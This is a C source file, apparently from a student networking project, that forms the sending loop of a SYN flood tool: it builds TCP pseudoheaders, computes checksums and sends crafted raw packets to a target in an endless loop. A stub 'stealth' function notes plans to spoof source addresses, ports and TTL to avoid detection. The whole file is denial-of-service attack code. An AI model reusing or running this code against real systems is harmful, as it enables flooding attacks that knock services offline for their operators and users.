/*
** send.c for send in /home/janel/Projects/templates/network/SYN_flooder
**
** Made by Janel
** Login   <janel@epitech.net>
**
** Started on  Wed Jun  7 15:02:24 2017 Janel
** Last update Thu Jul 13 12:12:08 2017 Janel
*/

#define _BSD_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <netinet/ip.h>
#include "layer3.h"
#include "layer4.h"
#include "syn_flooder.h"
#include "debug.h"

__inline__ static void	stealth(unsigned char * const packet)
{
  INSIDE;
  /* change: source_address, source_port, TTL, enum on window size */
  (void)packet;
}

static void	build_tcp_pseudoheader(t_tcp_pseudoheader *tcp_pseudoheader,
				       unsigned char *packet,
				       const char *src, const char *dest)
{
  fprintf(stdout, "* Building TCP pseudoheader..\n");
  tcp_pseudoheader->source_address = inet_addr(src);
  tcp_pseudoheader->destination_address = inet_addr(dest);
  tcp_pseudoheader->reserved = 0;
  tcp_pseudoheader->protocol = IPPROTO_TCP;
  tcp_pseudoheader->tcp_segment_length = htons(sizeof(t_tcp_header));
  tcp_pseudoheader->tcp_header = (t_tcp_header *)(packet + sizeof(struct iphdr));
  fprintf(stdout, "(tcp_pseudoheader->source_address: %s)\n", src);
  fprintf(stdout, "(tcp_pseudoheader->destination_address: %s)\n", dest);

  fprintf(stdout, "(tcp_pseudoheader->reserved: %d)\n", tcp_pseudoheader->reserved);
  fprintf(stdout, "(tcp_pseudoheader->protocol: %d)\n", tcp_pseudoheader->protocol);

}

__inline__ static void	checksum_packet(const unsigned char * const packet,
					const t_tcp_pseudoheader * const pseudoheader)
{
  /* ((t_tcp_header *)(packet + sizeof(struct iphdr)))->checksum = 0; */
  fprintf(stdout, "* Calculating checksum over TCP pseudoheader..\n");
  ((t_tcp_header *)(packet + sizeof(struct iphdr)))->checksum = csum((unsigned short *)pseudoheader, sizeof(t_tcp_pseudoheader));
}

char			send_packet(const int sd, unsigned char *packet,
				    struct sockaddr_in *dest_addr,
				    const char *src, const char *dest)
{
  t_tcp_pseudoheader	tcp_pseudoheader;
  t_tcp_header		*tcp_header;

  tcp_header = (t_tcp_header *)(packet + sizeof(struct iphdr));
  while (TRUE)
    {
      /* stealth(packet); */
      tcp_header->checksum = 0;
      /* ((t_tcp_header *)(packet + sizeof(struct iphdr)))->checksum = 42; */
      build_tcp_pseudoheader(&tcp_pseudoheader, packet, src, dest);
      checksum_packet(packet, (const t_tcp_pseudoheader *)&tcp_pseudoheader);

      fprintf(stdout, "(tcp_header->checksum: 0x%x)\n", tcp_header->checksum);
      fprintf(stdout, "(ntohs(tcp_header->checksum): 0x%x\n", ntohs(tcp_header->checksum));
      fprintf(stdout, "(htons(tcp_header->checksum): 0x%x\n", htons(tcp_header->checksum));

      fprintf(stdout, "(tcp_header->window: %d)\n", ntohs(tcp_header->window));
      fprintf(stdout, "(tcp_header->offset: %d)\n", tcp_header->offset);
      fprintf(stdout, "(tcp_header->sequence_number: %d)\n", tcp_header->sequence_number);

      if ((sendto(sd, packet, ((t_ip_header *)packet)->total_length, 0,
		  (const struct sockaddr *)dest_addr, sizeof(struct sockaddr_in))) == -1)
	return (PRINT_ERROR("sendto():"), EXIT_FAILURE);
      usleep(SEND_TIME_DELAY);
      fprintf(stdout, "-------------------------\n");
    }
}
